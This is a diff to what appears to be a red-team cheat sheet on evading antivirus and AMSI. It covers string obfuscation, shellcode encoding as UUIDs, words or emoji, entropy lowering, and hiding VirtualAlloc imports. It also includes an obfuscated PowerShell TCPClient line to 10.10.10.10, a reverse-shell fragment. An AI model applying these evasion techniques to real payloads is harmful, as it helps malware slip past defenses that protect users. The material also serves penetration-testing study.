@@ -436,10 +436,25 @@ netsh advfirewall firewall add rule name="Allow port" dir=in action=allow protoc
 - [https://github.com/danielbohannon/Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)
 - [https://github.com/JoelGMSec/Invoke-Stealth](https://github.com/JoelGMSec/Invoke-Stealth)
 
-### Obfuscation techniques
-- Examples are in PowerShell but techniques can be implemented in every coding language
+### Evasion techniques
+- Most examples are in PowerShell but techniques can be implemented in every coding language
 
-#### Powershell
+#### Things that get you caught
+- Using Templates; MSbuild template / scripts / etc
+- Not changing variable & function names
+- Not removing comments
+- Not obfuscating common code exec patterns
+  - Appplies to scripts, templates & Compiled code
+- Not changing error messages etc.
+- Entropy
+   - Rougly - high entropy = more random
+   - Higher entropy = less compressible
+   - Problem: we encrypt shellcode to evade
+   - encrypted shellcode = more random -> higher entropy
+   - Dont randomize all the things
+      - Changing default variable/func. names is good, but random characters is bad. Use two-word pairs.
+
+#### How amsi evaluates PowerShell commands
 - The code is evaluated when its readable by the scripting engine
 - This is what allows us to still be able to obfuscate our code
 ```
@@ -456,9 +471,8 @@ Write-Host("He" + "llo" + "World")
 Write-Host("Hello World")
 ```
 
-### Changing the code
 #### Hash of file/code
- - Capitalization 
+ - Change Capitalization 
 	 - PowerShell ignores capitalization, AMSI ignored capitalization, but changing your hash is best practice.
 		 -   `$variablename = "amsicontext"` to `$VaRiAbLeNaMe = "amsicontext"`
 	- C# is case sensitive, but changing the capitalization changes the hash. (Must change every entry of the variable!)
@@ -469,21 +483,58 @@ Write-Host("Hello World")
 
 #### Byte strings
 - Change variable names
-	- `$variablename = "amsicontext"` to `$LoremIpsum = "amsicontext"`
+   - `$variablename = "amsicontext"` to `$LoremIpsum = "amsicontext"`
+   - Dont randomize all the things
+      - Changing default variable/func. names is good, but random characters is bad. Use two-word pairs (Example: DragonBerrySmasher)
 - Concatenation
-	- `"amsicontext"` to `"am" + "si" + "con" + "te" + "xt"`
+   - `"amsicontext"` to `"am" + "si" + "con" + "te" + "xt"`
 - Variable insertion
-	- `$variablename = 'context'` into `$variablename2 = "Amsi$variablename"`
-	- C# `string variablename = "context"; string variablename2 = $"amsi{variablename}";`
-	- Format string
-		- `$variablename = "amsi{0}text -f "con"`
-		- `$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);` to `$client = New-Object ("{0}{1}" -f 'SySteM.Ne', 'T.SoCkEts.TCPCliEnt')("10.10.10.10",80);`
-		- C# `string variablename = "context"; string variablename2 = String.Format("amsi{0}",variablename);`
+   - `$variablename = 'context'` into `$variablename2 = "Amsi$variablename"`
+   - C# `string variablename = "context"; string variablename2 = $"amsi{variablename}";`
+   - Format string
+      - `$variablename = "amsi{0}text -f "con"`
+      - `$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);` to `$client = New-Object ("{0}{1}" -f 'SySteM.Ne', 'T.SoCkEts.TCPCliEnt')("10.10.10.10",80);`
+      - C# `string variablename = "context"; string variablename2 = String.Format("amsi{0}",variablename);`
 - Potentially the order of execution
-- For C# changing the variable type (i.e list vs array)
-- Encrypted strings
-- Properties of an object
-	- Can be obfuscated with backticks `$notify.icon` to ```$notify."i`c`on"```
+- Obfuscating shellcode
+   - Shellcode as UUID
+      - https://github.com/boku7/Ninja_UUID_Runner/blob/main/bin2uuids.py
+   - Reverse shellcode bytes
+   - Break into chunks
+   - Divide code into two arrays - even & odd bytes
+   - Steganography
+   - `BigInteger() h/t`
+   - Shellcode as english words
+      - https://github.com/hardwaterhacker/jargon
+   - Shellcode as Emoji
+      - https://github.com/RischardV/emoji-shellcoding
+- Lower entropy
+   - Languages are not random
+   - Create an array with a dictionary and compile it with the code (disable compiler optimization)
+- Misc
+   - PowerShell
+      - Properties of an object
+         - Can be obfuscated with backticks `$notify.icon` to ```$notify."i`c`on"```
+   - C#
+     - Changing the variable type (i.e list vs array) 
+     - Rename your entrypoints
+        -  https://learn.microsoft.com/th-th/dotnet/framework/interop/specifying-an-entry-point#renaming-a-function-in-c-and-c\
+```
+[DllImport("kernel32")]
+	private static extern IntPtr VirtualAlloc(
+	UInt32 lpStartAddr, 
+	UInt32 size, 
+	UInt32 flAllocationType, 
+	UInt32 flProtect);
+
+[DllImport("kernel32, EntryPoint = VirtualAlloc",
+	SetLastError = false, ExactSpelling = true)]
+	private static extern IntPtr SplendidDragon(
+	UInt32 lpStartAddr, 
+	UInt32 size, 
+	UInt32 flAllocationType, 
+	UInt32 flProtect);
+```
 
 #### Structure of the code
 - Change methods and lines of code around. 
